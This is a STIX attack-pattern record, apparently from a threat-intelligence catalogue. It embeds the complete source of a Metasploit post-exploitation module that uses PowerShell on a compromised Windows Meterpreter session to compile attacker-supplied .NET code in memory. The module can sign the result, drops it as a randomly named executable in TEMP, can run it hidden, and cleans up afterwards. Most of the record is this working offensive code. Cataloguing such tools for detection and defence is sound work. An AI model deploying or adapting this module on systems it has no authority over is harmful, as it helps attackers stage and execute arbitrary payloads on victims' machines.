{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3da989ce-7dc2-48b1-939b-6dc55ad0f42e",
    "created": "2024-08-14T16:33:05.000474Z",
    "modified": "2024-08-14T16:33:05.000478Z",
    "name": "Powershell .NET Compiler",
    "description": " This module will build a .NET source file using powershell. The compiler builds the executable or library in memory and produces a binary. After compilation the PowerShell session can also sign the executable if provided a path the a .pfx formatted certificate. Compiler options and a list of assemblies required can be configured in the datastore.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/powershell/build_net_code.rb",
            "external_id": "build_net_code.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  Rank = ExcellentRanking\n\n  include Msf::Post::Windows::Powershell\n  include Msf::Exploit::Powershell::DotNet\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Powershell .NET Compiler',\n        'Description' => %q{\n          This module will build a .NET source file using powershell. The compiler builds\n          the executable or library in memory and produces a binary. After compilation the\n          PowerShell session can also sign the executable if provided a path the\n          a .pfx formatted certificate. Compiler options and a list of assemblies\n          required can be configured in the datastore.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => 'RageLtMan <rageltman[at]sempervictus>',\n        'Platform' => [ 'windows' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'DisclosureDate' => '2012-08-14',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_stat\n              stdapi_sys_config_getenv\n              stdapi_sys_config_getsid\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptPath.new('SOURCE_FILE', [true, 'Path to source code']),\n        OptBool.new('RUN_BINARY', [false, 'Execute the generated binary', false]),\n        OptString.new('ASSEMBLIES', [false, 'Any assemblies outside the defaults', 'mscorlib.dll, System.dll, System.Xml.dll, System.Data.dll' ]),\n        OptString.new('OUTPUT_TARGET', [false, 'Name and path of the generated binary, default random, omit extension' ]),\n        OptString.new('COMPILER_OPTS', [false, 'Options to pass to compiler', '/optimize']),\n        OptString.new('CODE_PROVIDER', [true, 'Code provider to use', 'Microsoft.CSharp.CSharpCodeProvider'])\n      ], self.class\n    )\n    register_advanced_options(\n      [\n        OptString.new('NET_CLR_VER', [false, 'Minimum NET CLR version required to compile', '4.0'])\n      ], self.class\n    )\n  end\n\n  def run\n    # Make sure we meet the requirements before running the script\n    unless session.type == 'meterpreter' || have_powershell?\n      print_error 'Incompatible Environment'\n      return 0\n    end\n\n    # Havent figured this one out yet, but we need a PID owned by a user, can't steal tokens either\n    if client.sys.config.is_system?\n      print_error 'Cannot run as system'\n      return 0\n    end\n\n    # End of file marker\n    eof = Rex::Text.rand_text_alpha(8)\n    env_suffix = Rex::Text.rand_text_alpha(8)\n    net_com_opts = {}\n    net_com_opts[:target] =\n      datastore['OUTPUT_TARGET'] ||\n      \"#{session.sys.config.getenv('TEMP')}\\\\#{Rex::Text.rand_text_alpha(rand(8..15))}.exe\"\n    net_com_opts[:com_opts] = datastore['COMPILER_OPTS']\n    net_com_opts[:provider] = datastore['CODE_PROVIDER']\n    net_com_opts[:assemblies] = datastore['ASSEMBLIES']\n    net_com_opts[:net_clr] = datastore['NET_CLR_VER']\n    net_com_opts[:cert] = datastore['CERT_PATH']\n\n    begin\n      net_com_opts[:harness] = ::File.read(datastore['SOURCE_FILE'])\n      script = dot_net_compiler(net_com_opts)\n      if datastore['Powershell::Post::dry_run']\n        print_good \"Compiler code:\\n#{script}\"\n        return\n      end\n    rescue StandardError => e\n      print_error e\n      return\n    end\n\n    vprint_good \"Writing to #{net_com_opts[:target]}\"\n\n    # Execute the powershell script\n    print_status 'Building remote code.'\n    cmd_out, running_pids, open_channels = execute_script(script, true)\n    get_ps_output(cmd_out, eof)\n    vprint_good \"Cleaning up #{running_pids.join(', ')}\"\n\n    clean_up(nil, eof, running_pids, open_channels, env_suffix, false)\n\n    # Check for result\n    begin\n      size = session.fs.file.stat(net_com_opts[:target].gsub('\\\\', '\\\\\\\\')).size\n      print_good \"File #{net_com_opts[:target].gsub('\\\\', '\\\\\\\\')} found, #{size}kb\"\n    rescue StandardError\n      print_error \"File #{net_com_opts[:target].gsub('\\\\', '\\\\\\\\')} not found,\" \\\n                  \" NET CLR version #{datastore['NET_CLR_VER']} possibly not available\"\n      return\n    end\n\n    # Run the result\n    if datastore['RUN_BINARY']\n      cmd_out = session.sys.process.execute(net_com_opts[:target].gsub('\\\\', '\\\\\\\\'),\n                                            nil, 'Hidden' => true, 'Channelized' => true)\n      while (out = cmd_out.channel.read)\n        print_good out\n      end\n    end\n\n    print_good 'Finished!'\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-14",
    "x_mitre_platforms": [
        "[ 'windows' ]"
    ]
}